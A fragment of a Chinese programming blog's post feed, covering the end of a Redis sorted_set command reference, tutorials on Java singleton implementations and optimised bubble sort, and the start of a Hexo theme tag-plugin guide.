style="text-align:center">命令</th><th style="text-align:center">范例</th><th style="text-align:center">删除方式</th></tr></thead><tbody><tr><td style="text-align:center">zremrangebyrank key start stop</td><td style="text-align:center">zremrangebyrank u1 0 1</td><td style="text-align:center">按索引删除</td></tr><tr><td style="text-align:center">zremrangebyscore key min max</td><td style="text-align:center">zremrangebyscore u1 50 80</td><td style="text-align:center">按score删除</td></tr></tbody></table></div><p>注意：</p><p>min与max用于限定搜索查询条件</p><p>start与stop用于限定查询范围，作用与索引，表示开始和结束的索引</p><p>offset与count用于限定查询范围，作用与查询结果，表示开始位置和数据总量</p><ul><li><strong>获取集合数据总量</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zcard key</td></tr><tr><td style="text-align:center">zcount key min max</td></tr></tbody></table></div><ul><li><strong>集合交、并操作</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zinterstore destination numkeys key [key …]</td></tr><tr><td style="text-align:center">zunionstore destination numkeys key [key …]</td></tr></tbody></table></div><h4 id="sorted-set类型数据的扩展操作"><a href="#sorted-set类型数据的扩展操作" class="headerlink" title="sorted_set类型数据的扩展操作"></a>sorted_set类型数据的扩展操作</h4><ul><li><strong>获取数据对应的索引（排名）</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zrank key member</td></tr><tr><td style="text-align:center">zrevrank key member</td></tr></tbody></table></div><ul><li><strong>score值获取与修改</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">操作名称</th></tr></thead><tbody><tr><td style="text-align:center">zscore key member</td><td style="text-align:center">获取</td></tr><tr><td style="text-align:center">zincrby key increment member</td><td style="text-align:center">修改</td></tr></tbody></table></div><ul><li><strong>获取当前系统时间</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">time</td><td style="text-align:center">1）“1569575565”  2) “434277”</td></tr></tbody></table></div><h5 id="sorted-set类型数据操作的注意事项"><a href="#sorted-set类型数据操作的注意事项" class="headerlink" title="sorted_set类型数据操作的注意事项"></a>sorted_set类型数据操作的注意事项</h5><ul><li><p>score保存的数据存储空间是64位，如果 是整数范围是-9007199254740992~9007199254740992</p></li><li><p>score保存的数据也可以是一个双精度的double值，基于双精度浮点数的特征，可能会丢失精度，使用时要慎重</p></li><li><p>sorted_set底层存储还是基于set结构，因此数据不能重复，如果重复添加相同数据，score值将被反复覆盖，保留最后一次修改结果</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单列设计模式</title>
      <link href="2021/03/07/%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>2021/03/07/%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么会有单列设计模式？"><a href="#为什么会有单列设计模式？" class="headerlink" title="为什么会有单列设计模式？"></a>为什么会有单列设计模式？</h3><p>当应用程序中创建了多个实例时可能会造成资源的浪费。并且多次调用多个实例操作数据时容易造成结果错误。而单例模式能保证应用程序中有且只有一个实例。可以保证一个类在内存中的对象的唯一性，在一些常用的工具类、线程池、缓存、数据库等程序中可能只允许我们创建一个对象。</p><h3 id="单例模式的设计思想"><a href="#单例模式的设计思想" class="headerlink" title="单例模式的设计思想"></a>单例模式的设计思想</h3><p>单例模式的关键在于保证应用程序中有且仅有一个对象，如何保证只有一个对象呢？其实只需要三步就可以保证对象的唯一性：</p><p>（1）不允许其他类new对象</p><p>（2）在本类中创建对象</p><p>（3）对外提供一个可以让其他类获取该对象方法</p><p>将上面步骤转化为代码描述为：</p><p>（1）私有化本类的构造方法</p><p>（2）通过new关键字在本类中创建一个本类对象</p><p>（3）定义一个公有方法，将在本类中创建的对象返回</p><h3 id="单例模式的java代码实现："><a href="#单例模式的java代码实现：" class="headerlink" title="单例模式的java代码实现："></a>单例模式的java代码实现：</h3><p>单例模式可以分为两大类：饿汉式、懒汉式。</p><p>饿汉式和懒汉式的区别：</p><ul><li><p>饿汉式：指全局的单例实例在类装载时构建。</p></li><li><p>懒汉式：指全局的单例实例在第一次被使用时构建。</p></li></ul><p>单例模式的写法大致可以分为5类：懒汉式、饿汉式、双重校验锁、静态内部类、枚举。</p><h4 id="单例模式的饿汉式（可用）"><a href="#单例模式的饿汉式（可用）" class="headerlink" title="单例模式的饿汉式（可用）"></a>单例模式的饿汉式（可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>优点：</p><p>实现简单，在类加载时就完成了实例化，避免了线程同步问题。</p><p>缺点：</p><p>由于在类加载时就完成实例化，所以没有达到（Lazy Loading）懒加载的效果，也就是说可能我没有用到这个实例它也会创建，会造成内存浪费（但是这个浪费可以忽略，所以也是推荐使用的）。</p><h4 id="单例模式的饿汉式变换写法（可用）"><a href="#单例模式的饿汉式变换写法（可用）" class="headerlink" title="单例模式的饿汉式变换写法（可用）"></a>单例模式的饿汉式变换写法（可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>其实这种写法和上一种写法一样，都是在类初始化时创建对象的，它的优缺点和上面一样，只是写法有点不同，可以归为一种写法。</p><h4 id="单例模式的懒汉式（线程不安全，不可用）"><a href="#单例模式的懒汉式（线程不安全，不可用）" class="headerlink" title="单例模式的懒汉式（线程不安全，不可用）"></a>单例模式的懒汉式（线程不安全，不可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">           singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>这种方式是在调用getSingleton()方法时才创建对象，它相对于饿汉式比较懒，因此被称为懒汉式。</p><p>上述这种写法其实是存在线程安全问题的，那为什么会存在线程安全问题呢？</p><p>是因为在运行过程中可能会存在这么一种情况：当有多个线程去调用getSingleton()方法来获取Singleton的实例时，第一个线程在执行if(singleton == null)这个语句时，此时singleton 是为null，进入语句。在还没有执行singleton = new Singleton()时（此时singleton还是为null的）第二个线程也进入if(singleton == null)这个语句，因为第一个线程还没有执行singleton = new Singleton()，所以它会继续执行singleton = new Singleton()语句来实例化Singleton对象，因为第二个线程也进入了if语句，所以它也会实例化一个Singleton对象。这样就导致实例化了两个Singleton对象。所以它是存在线程安全的。</p><h4 id="线程安全的懒汉式（线程安全，效率低不推荐使用）"><a href="#线程安全的懒汉式（线程安全，效率低不推荐使用）" class="headerlink" title="线程安全的懒汉式（线程安全，效率低不推荐使用）"></a>线程安全的懒汉式（线程安全，效率低不推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">           singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>虽然通过加锁的方式解决了上面一种写法的线程安全问题，但是效率低。</p><p>缺点：</p><p>效率低，每个线程想要获得Singleton对象的时候，执行getSingleton()方法都要进行同步。而其实这个方法只需要执行一次实例化代码就够了，后面想要获得Singleton对象，直接return就行了。方法进行同步效率太低需要改进。</p><h4 id="单例模式的懒汉式（线程不安全，不可用）-1"><a href="#单例模式的懒汉式（线程不安全，不可用）-1" class="headerlink" title="单例模式的懒汉式（线程不安全，不可用）"></a>单例模式的懒汉式（线程不安全，不可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>由于上面一种写法效率太低，可能有人会想到这种写法。其实这种写法跟（3）的写法一样是线程不安全的。当一个线程还没有实例化Singleton时，另一个线程执行到if(singleton == null)语句时就会进入到if语句，虽然加了锁，但等到第一个线程执行完singleton = new Singleton()跳出这个锁时，另一个已经进入if语句的线程同样会实例化一个新的Singleton对象。线程不安全的原理跟（3）中的类似，因此这种方法并不可行。</p><h4 id="单例模式懒汉式双重校验锁（推荐使用）"><a href="#单例模式懒汉式双重校验锁（推荐使用）" class="headerlink" title="单例模式懒汉式双重校验锁（推荐使用）"></a>单例模式懒汉式双重校验锁（推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>这一版代码解决了（3）和（4）中存在的问题，其中有两次if(singleton == null)的判断，这个叫做【双重检查 Double-Check】。</p><ul><li><p>第一个if(singleton == null)，其实是为了解决（4）中效率问题，只有singleton为null时，才进入synchronized的代码段。</p></li><li><p>第二个if(singleton == null)则是为了解决（3）中的线程安全问题，防止多线程可能实例多个对象的情况。</p></li></ul><p>volatile关键字是为了防止指令重排出现错误，就是说，由于有一个singleton不为null了，但是仍没有完成初始化的中间态，而这个时候，如果有其他线程刚好运行到第一层if语句，这里读取的singleton已经不为null了，所以直接把这个中间态的singleton拿去用，就会产生问题。（涉及原子操作、指令重排知识，volatile关键字的一个作用是禁止指令重排）</p><p>优点：</p><p>线程安全；延迟加载；效率较高</p><h4 id="内部类（推荐使用）"><a href="#内部类（推荐使用）" class="headerlink" title="内部类（推荐使用）"></a>内部类（推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>它利用了ClassLoader来保证了同步，同时又能让开发者控制类加载的时机。从内部看是一个饿汉式的单例，但从外部看又的确是懒汉式实现</p><p>优点：</p><p>避免了线程不安全；延迟加载；效率高。</p><h4 id="枚举（极推荐使用）"><a href="#枚举（极推荐使用）" class="headerlink" title="枚举（极推荐使用）"></a>枚举（极推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">SingletonEnum</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    singleton;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingletonEnum</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">SingletonEnum.singleton.method();</span><br></pre></td></tr></table></figure><p>由于创建枚举实例的过程是线程安全的，所以这种写法也没有同步的问题。</p><p>优点：</p><p>这种写法在功能上与共有域方法相近，但它更简洁，无偿地提供了序列化机制，绝对防止对此实例化，即使是在面对复杂的序列化或者反射攻击的时候。</p><hr><p><strong>如有错误欢迎指出</strong>！</p><hr>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冒泡排序</title>
      <link href="2021/03/04/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>2021/03/04/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h2><hr><h3 id="1、什么是冒泡排序？"><a href="#1、什么是冒泡排序？" class="headerlink" title="1、什么是冒泡排序？"></a>1、什么是冒泡排序？</h3><p>&ensp;&ensp;&ensp;&ensp;我们把相邻的元素进行两两比较，根据大小来交换元素的位置。</p><p>&ensp;&ensp;&ensp;&ensp;原始的冒泡排序是稳定排序，由于该排序算法的每一轮都要遍历所有元素，轮转的次数和元素数量相当，所以时间复杂度是O（N^2）</p><hr><h3 id="2、java代码实现及优化："><a href="#2、java代码实现及优化：" class="headerlink" title="2、java代码实现及优化："></a>2、java代码实现及优化：</h3><h4 id="（1）原始的冒泡排序："><a href="#（1）原始的冒泡排序：" class="headerlink" title="（1）原始的冒泡排序："></a>（1）原始的冒泡排序：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length-i-<span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="（2）冒泡排序优化一："><a href="#（2）冒泡排序优化一：" class="headerlink" title="（2）冒泡排序优化一："></a>（2）冒泡排序优化一：</h4><p>&ensp;&ensp;&ensp;&ensp;从上一版代码可以很明显看出，自从经过第六轮排序，整个数列已然是有序的了。但是排序算法仍然继续执行第七轮、第八轮。这种情况下，如果我们能判断出数列已经有序，并且做出标记，剩下的几轮排序就可以不必执行，提早结束工作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="comment">//有序标记，判断数组是否有序，初始值为true（true表示有序，false表示无序）</span></span><br><span class="line">        <span class="keyword">boolean</span> isSorted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length-i-<span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">                <span class="comment">//有元素交换，所以不是有序，标记变为false</span></span><br><span class="line">                isSorted = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果是有序数组，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span>(isSorted)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp;&ensp;&ensp;&ensp;这一版代码利用布尔变量isSorted作为标记。如果在本轮排序中，元素有交换，则说明数列无序；如果没有元素交换，说明数列已然有序，直接跳出大循环。</p><hr><h4 id="（3）冒泡排序优化二："><a href="#（3）冒泡排序优化二：" class="headerlink" title="（3）冒泡排序优化二："></a>（3）冒泡排序优化二：</h4><p>&ensp;&ensp;&ensp;&ensp;按照上一版代码的逻辑，有序区的长度和排序的轮数是相等的。比如第一轮排序过后的有序区长度是1，第二轮排序过后的有序区长度是2，以此类推……。实际上，数列真正的有序区可能会大于这个长度，比如{3,4,2,1,5,6,7,8}数组的第二轮，后面5个元素实际都已经属于有序区。因此后面的许多次元素比较是没有意义的。</p><p>&ensp;&ensp;&ensp;&ensp;当对于{3,4,2,1,5,6,7,8}这种特殊数据时，后半部分{……,5,6,7,8}已经是有序的,因此可以通过对数列的有序区做界定，在每一轮排序的最后，记录下最后一次元素交换的位置，那个位置也就是无序数列的边界，再往后就是有序区了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//记录最后一次交换的位置</span></span><br><span class="line">    <span class="keyword">int</span> lastExchangeIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//无序数列的标记，每次只需比较到这里为止</span></span><br><span class="line">    <span class="keyword">int</span> sortBorder = array.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="comment">//有序标记，判断数组是否有序，初始值为true（true表示有序，false表示无序）</span></span><br><span class="line">        <span class="keyword">boolean</span> isSorted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//只比较到无序数列边界</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; sortBorder; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">                <span class="comment">//有元素交换，所以不是有序，标记变为false</span></span><br><span class="line">                isSorted = <span class="keyword">false</span>;</span><br><span class="line">                <span class="comment">//记录最后一次交换的位置</span></span><br><span class="line">                lastExchangeIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把无序数列的边界更新为最后一次交换元素的位置</span></span><br><span class="line">        sortBorder = lastExchangeIndex;</span><br><span class="line">        <span class="comment">//如果是有序数组，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span>(isSorted)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp;&ensp;&ensp;&ensp;这一版代码中，sortBorder就是无序数列的边界。每一轮排序过程中，sortBorder之后的元素就完全不需要比较了，肯定是有序的。</p><hr><p><strong>&ensp;&ensp;&ensp;&ensp;如有错误欢迎留言！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 排序算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tag Plugins Plus</title>
      <link href="2021/02/20/Tag-Plugins-Plus(1)/"/>
      <url>2021/02/20/Tag-Plugins-Plus(1)/</url>
      
        <content type="html"><![CDATA[<div class="tip home"><p>本文档为<a href="https://jq.qq.com/?_wv=1027&amp;k=EF1Elvqp">🧊Akilarの糖果屋🍭</a>出品，转载需注明出处。</p><p>若您在使用本帖教程后，发现样式无法完全还原，请重点排查您的其余第三方魔改css样式，例如css中是否存在<code>.circle</code>、<code>.square</code>等易重class名。</p></div><details class="folding-tag" red><summary> 点开查看开发记录 </summary>              <div class='content'>              <div class="note blue icon modern"><i class="note-icon fas fa-bullhorn"></i><p>本文所涉及的样式，主要参考的是各类已有主题，并对相应styl文件进行样式修改以及添加夜间模式适配。已尽可能追根溯源找到了各部分魔改内容最初的作者，如有错误和遗漏还请联系我修改。</p></div><div class="timeline"><p class='p h2'>开发记录</p><div class="timenode"><div class="meta"><p><p>2020-11-14:内测版v0.05</p></p></div><div class="body"><ol><li>主要使用了<a href="https://github.com/volantis-x/hexo-theme-volantis">Volantis</a>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。</li><li>主要参考内容<ul><li><a href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></li><li><a href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins）</a></li><li><a href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></li><li><a href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></li><li><a href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></li></ul></li></ol></div></div><div class="timenode"><div 